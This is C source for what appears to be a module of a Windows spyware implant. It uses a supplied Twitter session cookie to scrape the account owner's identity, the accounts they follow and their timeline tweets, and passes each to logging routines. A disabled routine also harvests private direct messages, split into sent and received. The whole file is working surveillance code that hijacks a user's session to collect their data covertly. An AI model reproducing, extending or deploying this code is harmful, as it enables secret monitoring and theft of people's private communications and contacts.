#include <windows.h>
#include <stdio.h>
#include <time.h>

#include "social.h"
#include "twitter.h"
#include "debug.h"
#include "zmem.h"
#include "JSON.h"
#include "conf.h"


#define TWITTER_FOLLOWER 1
#define TWITTER_FRIEND   0

#define LOOP for(;;)
#define SAFE_FREE(x)  { if(x) free(x); x = NULL; }


DWORD ParseFollowing(char *user, char *cookie)
{
	DWORD ret_val;
	BYTE *r_buffer = NULL;
	DWORD response_len;
	char *parser1, *parser2;
	
	char screen_name[256];
	char following_contact[256];
	

#ifdef _DEBUG
		OutputDebug(L"[*] %S\n", __FUNCTION__);
#endif
			
	ret_val = HttpSocialRequest(L"twitter.com", L"GET", L"/following", 443, NULL, 0, &r_buffer, &response_len, cookie);

	if (ret_val != SOCIAL_REQUEST_SUCCESS)
		return ret_val;

	parser1 = (char *)r_buffer;
	
	for (;;) {

		/* 1] following contact
			e.g. <div class="ProfileCard js-actionable-user"   data-screen-name="thegrugq_ebooks"
		*/

		// advance first token
		parser1 = strstr(parser1, TWITTER_FOLLOWING_CONTACT_1);
		if( !parser1 )
			break;
		
		parser1 += strlen(TWITTER_FOLLOWING_CONTACT_1);

		// advance second token
		parser1 = strstr(parser1, TWITTER_FOLLOWING_CONTACT_2);
		if( !parser1 )
			break;
		
		parser1 += strlen(TWITTER_FOLLOWING_CONTACT_2);

		parser2 = strchr(parser1, '"');

		if( !parser2 )
			break;

		*parser2 = NULL;
		_snprintf_s(following_contact, sizeof(following_contact), _TRUNCATE, parser1);
		parser1 = parser2 + 1;

#ifdef _DEBUG
		OutputDebug(L"[*] %S - contact name: %S\n", __FUNCTION__, following_contact);
#endif

		/* 2] screen name
			e.g.  data-name="The real Grugq" 
		*/
		parser1 = strstr(parser1, TWITTER_TWEET_DISPLAY_NAME_START);
		if( !parser1 )
			break;

		parser1 += strlen(TWITTER_TWEET_DISPLAY_NAME_START);
		
		parser2 = strchr( parser1, '"');
		if( !parser2 )
			break;

		*parser2 = NULL;
		_snprintf_s(screen_name, sizeof(screen_name), _TRUNCATE, parser1);
		parser1 = parser2 + 1;

#ifdef _DEBUG
		OutputDebug(L"[*] %S - screen name: %S\n", __FUNCTION__, screen_name);
#endif
		SocialLogContactA(CONTACT_SRC_TWITTER, screen_name, NULL, NULL, NULL, NULL, NULL, NULL, NULL, following_contact, NULL, TWITTER_FOLLOWER);
		
	}

	SAFE_FREE(r_buffer);
	return SOCIAL_REQUEST_SUCCESS;
}

DWORD TwitterContactHandler(char *cookie)
{
	DWORD ret_val;
	BYTE *r_buffer = NULL;
	DWORD response_len;
	char *parser1, *parser2;
	char user[256];
	WCHAR user_name[256];
	static BOOL scanned = FALSE;

	if (!ConfIsModuleEnabled(L"addressbook"))
		return SOCIAL_REQUEST_SUCCESS;


#ifdef _DEBUG
		OutputDebug(L"[*] %S\n", __FUNCTION__);
#endif
		
	if (scanned)
		return SOCIAL_REQUEST_SUCCESS;

	// Identifica l'utente
	ret_val = HttpSocialRequest(L"twitter.com", L"GET", L"/", 443, NULL, 0, &r_buffer, &response_len, cookie);	
	if (ret_val != SOCIAL_REQUEST_SUCCESS)
		return ret_val;

	parser1 = (char *)r_buffer;
	LOOP {
		parser1 = (char *)strstr((char *)parser1, "data-user-id=\"");
		if (!parser1) {
			SAFE_FREE(r_buffer);
			return SOCIAL_REQUEST_BAD_COOKIE;
		}
		parser1 += strlen("data-user-id=\"");
		parser2 = (char *)strchr((char *)parser1, '\"');
		if (!parser2) {
			SAFE_FREE(r_buffer);
			return SOCIAL_REQUEST_BAD_COOKIE;
		}
		*parser2=0;
		_snprintf_s(user, sizeof(user), _TRUNCATE, "%s", parser1);
		if (strlen(user)) 
			break;
		parser1 = parser2 + 1;
	}

	// Cattura il proprio account
	parser1 = parser2 + 1;
	parser1 = (char *)strstr((char *)parser1, "data-screen-name=\"");
	if (parser1) {
		parser1 += strlen("data-screen-name=\"");
		parser2 = (char *)strchr((char *)parser1, '\"');
		if (parser2) {
			*parser2=0;
			
			_snwprintf_s(user_name, sizeof(user_name)/sizeof(WCHAR), _TRUNCATE, L"%S", parser1);		
#ifdef _DEBUG
			OutputDebug(L"[*] %S: username %s\n", __FUNCTION__, user_name);
#endif
			SocialLogContactW(CONTACT_SRC_TWITTER, user_name, NULL, NULL, NULL, NULL, NULL, NULL, NULL, user_name, NULL, CONTACTS_MYACCOUNT);
			
		}
	}
	
	SAFE_FREE(r_buffer);
	scanned = TRUE;

	
	return ParseFollowing(user, cookie);
}

DWORD ParseDirectMessages(char *username, char *cookie)
{
	DWORD ret_val, response_len;
	BYTE *r_buffer = NULL, *thread_buffer = NULL;
	char *parser1, *parser2, *thread_parser1, *thread_parser2;
	char strCurrentThreadHandle[512];
	WCHAR strConversationRequest[512];
	char strDmType[24];
	char strDmContent[256];
	char strTimestamp[256];
	DWORD last_tstamp_hi, last_tstamp_lo;
	ULARGE_INTEGER act_tstamp;
	struct tm tstamp;
	char strUsernameForDm[256];
	DWORD dwHigherBatchTimestamp = 0;


#ifdef _DEBUG
		OutputDebug(L"[*] %S\n", __FUNCTION__);
#endif

	/* use a new username for twitter dm since the timestamp would be the one we got from the timeline */
	_snprintf_s(strUsernameForDm, sizeof(strUsernameForDm), _TRUNCATE, "%s-twitterdm", username);
	last_tstamp_lo = SocialGetLastTimestamp(strUsernameForDm, &last_tstamp_hi);
	if (last_tstamp_lo == SOCIAL_INVALID_TSTAMP)
		return SOCIAL_REQUEST_BAD_COOKIE;


	ret_val = XmlHttpSocialRequest(L"twitter.com", L"GET", L"/messages?last_note_ts=0&since_id=0", 443, NULL, 0, &r_buffer, &response_len, cookie, L"https://twitter.com/");

	if (ret_val != SOCIAL_REQUEST_SUCCESS)
		return ret_val;

	parser1 = (char *) r_buffer;

	/*	Fetch the available threads
		e.g. "threads":["duilio_ebooks","duiliosagese","thegrugq_ebooks"] 
	*/
	parser1 = strstr(parser1, "\"threads\":[");
	if( !parser1 )
	{
		SAFE_FREE(r_buffer);
		return -1;
	}

	parser1 = parser1 + strlen("\"threads\":[");
	parser2 = strstr(parser1, "\"]},");

	if( !parser2 )
	{
		zfree(r_buffer);
		return SOCIAL_REQUEST_BAD_COOKIE;
	}
	parser2 += 1; // skip past last '"'
	*parser2 = NULL;

#ifdef _DEBUG
	OutputDebug(L"[*] %S - available threads %S\n", __FUNCTION__, parser1);
#endif
	
	/*	loop through the list of available threads pointed by parser1 and requests its content 
		e.g. "duilio_ebooks","duiliosagese","thegrugq_ebooks"
	*/
	for( ;; ) {
		parser1 = strchr(parser1, '"');
		if( !parser1 )
			break;

		parser1 += 1; // skip past '"'

		parser2 = strchr(parser1, '"');
		if( !parser2 )
			break;

		*parser2 = NULL;
		_snprintf_s(strCurrentThreadHandle, sizeof(strCurrentThreadHandle), _TRUNCATE, parser1);
		parser1 = parser2 + 1;

#ifdef _DEBUG
		OutputDebug(L"[*] %S - parsing thread %S\n", __FUNCTION__, strCurrentThreadHandle);
#endif

		/*	fetch conversation
			e.g. /messages/with/conversation?id=duilio_ebooks&last_note_ts=0 
		*/
		_snwprintf_s(strConversationRequest, sizeof(strConversationRequest)/sizeof(WCHAR), _TRUNCATE, L"/messages/with/conversation?id=%S&last_note_ts=0", strCurrentThreadHandle);
		ret_val = XmlHttpSocialRequest(L"twitter.com", L"GET", strConversationRequest, 443, NULL, 0, &thread_buffer, &response_len, cookie, L"https://twitter.com/");

		/* if the request is not successful assume some serious issue happened, free resources and bail */
		if (ret_val != SOCIAL_REQUEST_SUCCESS)
		{
			zfree(thread_buffer);
			zfree(r_buffer);
			return ret_val;

		}

		/* direct message structure:
			1] start of a new message: '<div class="dm sent js-dm-item' or 'div class=\"dm received js-dm-item'
				find '<div class="dm ' (N.B space after dm) then decode whether it's send or received
			2] content:  <p class="js-tweet-text tweet-text" >MESSAGE</p>
			3] timestamp: data-time="1414592790"
		*/

		thread_parser1 = (char *) thread_buffer;

		/* parse all the messages belonging to a conversation, when there aren't messages left bail */
		for( ;; )
		{

			thread_parser1 = strstr(thread_parser1, TWITTER_DM_ITEM); // START HERE: can't find TWITTER_DM_ITEM
			if( !thread_parser1 )
				break;

			thread_parser1 += strlen(TWITTER_DM_ITEM);

			thread_parser2 = strchr(thread_parser1, ' '); // skip past sent or received
			if( !thread_parser2 )
				break;

			*thread_parser2 = NULL;
			_snprintf_s(strDmType, sizeof(strDmType), _TRUNCATE, thread_parser1);
			thread_parser2 +=1;

			
#ifdef _DEBUG
			OutputDebug(L"[*] %S - dm type: '%S'\n", __FUNCTION__, strDmType);
#endif		

			thread_parser1 = strstr(thread_parser2, TWITTER_DM_CONTENT);
			if( !thread_parser1 )
				break;

			thread_parser1 = strstr(thread_parser1, "\\u003e"); // encoded '>'
			if( !thread_parser1 )
				break;

			thread_parser1 += strlen("\\u003e");
			thread_parser2 = strstr(thread_parser1, "\\u003c\\/p\\u003e"); // encoded </p>
			if( !thread_parser2 )
				break;

			*thread_parser2 = NULL;
			_snprintf_s(strDmContent, sizeof(strDmContent), _TRUNCATE, thread_parser1);
			thread_parser1 = thread_parser2 + 1;

#ifdef _DEBUG
			OutputDebug(L"[*] %S - dm content: '%S'\n", __FUNCTION__, strDmContent);
#endif	

			thread_parser1 = strstr(thread_parser1, TWITTER_DM_TIMESTAMP_START);
			if( !thread_parser1 )
				break;
			
			thread_parser1 += strlen(TWITTER_DM_TIMESTAMP_START);
			thread_parser2 = strstr(thread_parser1, "\\\"");

			if( !thread_parser2 )
				break;

			*thread_parser2 = NULL;
			_snprintf_s(strTimestamp, sizeof(strTimestamp), _TRUNCATE, thread_parser1);
			thread_parser1 = thread_parser2 + 1;

#ifdef _DEBUG
			OutputDebug(L"[*] %S - dm timestamp: '%S'\n", __FUNCTION__, strTimestamp);
#endif	

			/* if the tweet is new save it , discard otherwise */
			if (!atoi(strTimestamp))
				continue;

			sscanf_s(strTimestamp, "%llu", &act_tstamp);

			if( act_tstamp.LowPart > 2000000000 || act_tstamp.LowPart <= last_tstamp_lo)
				continue;

			/* should hold true only for the first tweet in the batch */
			if( act_tstamp.LowPart > dwHigherBatchTimestamp )
				dwHigherBatchTimestamp = act_tstamp.LowPart; 

			_gmtime32_s(&tstamp, (__time32_t *)&act_tstamp);
			tstamp.tm_year += 1900;
			tstamp.tm_mon++;


			/* strDmType is either 'sent' or received */
			if( !strcmp(strDmType, "sent") )
				SocialLogIMMessageA(CHAT_PROGRAM_TWITTER, strCurrentThreadHandle, strCurrentThreadHandle, username, username, strDmContent, &tstamp, FALSE);
			else if( !strcmp(strDmType, "received") )
				SocialLogIMMessageA(CHAT_PROGRAM_TWITTER, username, username, strCurrentThreadHandle, strCurrentThreadHandle, strDmContent, &tstamp, FALSE);

#ifdef _DEBUG
			OutputDebug(L"[*] %S - logging: %S <-> %S : %S %llu\n", __FUNCTION__, username, strCurrentThreadHandle, strDmContent, tstamp);
#endif


		}

		/* free loop allocated buffer */
		zfree(thread_buffer);
		thread_buffer = NULL;
	}

	/* save the most recent timestamp we got from all conversations */
	SocialSetLastTimestamp(strUsernameForDm, dwHigherBatchTimestamp, 0);

	zfree(thread_buffer); // if we bailed out of conversation parsing loop, thread_buffer is still allocated, proceed with free'ing
	zfree(r_buffer);
	return SOCIAL_REQUEST_SUCCESS;
}

DWORD ParseTweet(char *user, char *cookie)
{
	DWORD ret_val;
	BYTE *r_buffer = NULL;
	DWORD response_len;
	char *parser1, *parser2;
	char tweet_body[2048];
	char tweet_id[256];
	char screen_name[256];
	char tweet_author[256];
	char tweet_timestamp[256];
	ULARGE_INTEGER act_tstamp;
	DWORD last_tstamp_hi, last_tstamp_lo;
	struct tm tstamp;

	/*	since the first tweet of this batch will have a higher timestamp, 
		save it to update social status at the end of the batch  */
	DWORD dwHigherBatchTimestamp = 0;

#ifdef _DEBUG
		OutputDebug(L"[*] %S\n", __FUNCTION__);
#endif

		
	last_tstamp_lo = SocialGetLastTimestamp(user, &last_tstamp_hi);
	if (last_tstamp_lo == SOCIAL_INVALID_TSTAMP)
		return SOCIAL_REQUEST_BAD_COOKIE;

	ret_val = HttpSocialRequest(L"twitter.com", L"GET", L"/", 443, NULL, 0, &r_buffer, &response_len, cookie);

	if (ret_val != SOCIAL_REQUEST_SUCCESS)
		return ret_val;

	parser1 = (char *)r_buffer;
	
	/* loop through tweets retrieved from timeline, html structure for a tweet 
		1] tweet id
		2] author
		3] timestamp
		4] body
	*/
	for (;;) {

		/* 1] tweet id
			e.g. data-tweet-id="526625177615220736"
		*/
		parser1 = strstr(parser1, TWITTER_TWEET_ID_START);
		if( !parser1 )
			break;
		
		parser1 += strlen(TWITTER_TWEET_ID_START);
		parser2 = strchr(parser1, '"');

		if( !parser2 )
			break;

		*parser2 = NULL;
		_snprintf_s(tweet_id, sizeof(tweet_id), _TRUNCATE, parser1);
		parser1 = parser2 + 1;

#ifdef _DEBUG
		OutputDebug(L"[*] %S - tweet id: %S\n", __FUNCTION__, tweet_id);
#endif

		/* 2] tweet author and display name
			e.g. data-screen-name="TheEconomist" data-name="The Economist" data-user-id="5988062"
		*/
		parser1 = strstr(parser1, TWITTER_TWEET_AUTHOR_START);
		if( !parser1 )
			break;

		parser1 += strlen(TWITTER_TWEET_AUTHOR_START);
		parser2 = strchr(parser1, '"');

		if( !parser2 )
			break;

		*parser2 = NULL;
		_snprintf_s(tweet_author, sizeof(tweet_author), _TRUNCATE, parser1);
		parser1 = parser2 + 1;

#ifdef _DEBUG
		OutputDebug(L"[*] %S - tweet author: %S\n", __FUNCTION__, tweet_author);
#endif

		parser1 = strstr(parser1, TWITTER_TWEET_DISPLAY_NAME_START);
		if( !parser1 )
			break;

		parser1 += strlen(TWITTER_TWEET_DISPLAY_NAME_START);
		parser2 = strchr(parser1, '"');

		if( !parser2 )
			break;

		*parser2 = NULL;
		_snprintf_s(screen_name, sizeof(screen_name), _TRUNCATE, parser1);
		parser1 = parser2 + 1;

#ifdef _DEBUG
		OutputDebug(L"[*] %S - tweet screen_name: %S\n", __FUNCTION__, screen_name);
#endif

		/* 3] timestamp
			e.g.  data-time="1414392201"
		*/
		parser1 = strstr(parser1, TWITTER_TWEET_TIMESTAMP_START);
		if( !parser1 )
			break;

		parser1 += strlen(TWITTER_TWEET_TIMESTAMP_START);
		parser2 = strchr(parser1, '"');

		if( !parser2 )
			break;

		*parser2 = NULL;
		_snprintf_s(tweet_timestamp, sizeof(tweet_timestamp), _TRUNCATE, parser1);
		parser1 = parser2 + 1;

				
#ifdef _DEBUG
		OutputDebug(L"[*] %S - tweet time stamp: %S\n", __FUNCTION__, tweet_timestamp);
#endif


		/* 4] tweet body: 
		   e.g. <p class="js-tweet-text tweet-text" lang="en" data-aria-label-part="0">BODY</p>
		   a) find start of <p>, and then reach the end of <p>
		   b) find </p>
		*/
		parser1 = strstr(parser1, TWITTER_TWEET_START);
		if( !parser1 )
			break;

		parser1 = strchr(parser1, '>');
		if( !parser1 )
			break;

		parser1 += 1;
		parser2 = strstr(parser1, TWITTER_TWEET_END);

		if( !parser2 )
			break;

		*parser2 = NULL;
		_snprintf_s(tweet_body, sizeof(tweet_body), _TRUNCATE, "%s", parser1);
		parser1 = parser2 + 1;

#ifdef _DEBUG
		OutputDebug(L"[*] %S - tweet body: %S\n", __FUNCTION__, tweet_body);
#endif


		/* if the tweet is new save it , discard otherwise */
		if (!atoi(tweet_timestamp))
			continue;
		
		sscanf_s(tweet_timestamp, "%llu", &act_tstamp);
		
		if( act_tstamp.LowPart > 2000000000 || act_tstamp.LowPart <= last_tstamp_lo)
			continue;

		/* should hold true only for the first tweet in the batch */
		if( act_tstamp.LowPart > dwHigherBatchTimestamp )
			dwHigherBatchTimestamp = act_tstamp.LowPart; 

		_gmtime32_s(&tstamp, (__time32_t *)&act_tstamp);
		tstamp.tm_year += 1900;
		tstamp.tm_mon++;

#ifdef _DEBUG
		OutputDebug(L"[*] %S - logging: @%S -> %S : %llu\n", __FUNCTION__, screen_name, tweet_body, tstamp);
#endif
		SocialLogIMMessageA(CHAT_PROGRAM_TWITTER, "", "", screen_name, "", tweet_body, &tstamp, FALSE);
	
	}


	SocialSetLastTimestamp(user, dwHigherBatchTimestamp, 0);

	SAFE_FREE(r_buffer);
	return SOCIAL_REQUEST_SUCCESS;
}

DWORD TwitterMessageHandler(char *cookie)
{
	DWORD ret_val;
	BYTE *r_buffer = NULL;
	DWORD response_len;
	char *parser1, *parser2;
	char user[256];
	char userhandle[256];

	if (!ConfIsModuleEnabled(L"messages"))
		return SOCIAL_REQUEST_SUCCESS;

	// Identifica l'utente
	ret_val = HttpSocialRequest(L"twitter.com", L"GET", L"/", 443, NULL, 0, &r_buffer, &response_len, cookie);	
	if (ret_val != SOCIAL_REQUEST_SUCCESS)
		return ret_val;

	parser1 = (char *)r_buffer;
	LOOP {
		parser1 = (char *)strstr((char *)parser1, "data-user-id=\"");
		if (!parser1) {
			SAFE_FREE(r_buffer);
			return SOCIAL_REQUEST_BAD_COOKIE;
		}
		parser1 += strlen("data-user-id=\"");
		parser2 = (char *)strchr((char *)parser1, '\"');
		if (!parser2) {
			SAFE_FREE(r_buffer);
			return SOCIAL_REQUEST_BAD_COOKIE;
		}
		*parser2=0;
		_snprintf_s(user, sizeof(user), _TRUNCATE, "%s", parser1);
		if (strlen(user)) 
			break;
		parser1 = parser2 + 1;
	}

	// Cattura il proprio account
	parser1 = parser2 + 1;
	parser1 = (char *)strstr((char *)parser1, "data-screen-name=\"");
	if (parser1) {
		parser1 += strlen("data-screen-name=\"");
		parser2 = (char *)strchr((char *)parser1, '\"');
		if (parser2) {
			*parser2=0;
			
			_snprintf_s(userhandle, sizeof(userhandle), _TRUNCATE, "%s", parser1);
#ifdef _DEBUG
			OutputDebug(L"[*] %S: username %S\n", __FUNCTION__, userhandle);
#endif
						
		}
	}
	
	/* uncomment this function to enable dm */
	//ParseDirectMessages(userhandle, cookie); 

	SAFE_FREE(r_buffer);
	return ParseTweet(user, cookie);
}
